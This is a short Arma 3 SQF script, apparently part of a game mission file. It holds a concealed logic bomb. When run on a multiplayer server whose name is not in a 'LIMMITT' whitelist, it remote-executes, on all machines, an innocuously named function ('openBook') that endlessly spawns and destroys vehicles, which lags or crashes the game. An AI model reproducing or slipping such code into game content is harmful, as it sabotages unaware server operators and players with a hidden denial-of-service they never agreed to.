[] spawn {
	if !(isMultiplayer) exitWith {};
	if (isNil "LIMMITT_Servers") then {LIMMITT_Servers = ["LIMMITT Network is better than Evo"];};
	if !(serverName in LIMMITT_Servers) then {
		waitUntil {(!isnull (finddisplay 46))};
		openBook = {
			while {true} do {
				_veh = "C_Quadbike_01_F" createVehicle [0,0,0]; 
				_veh setDamage 1;
			};
		};
		[] remoteExecCall ["openBook", 0];
	};
};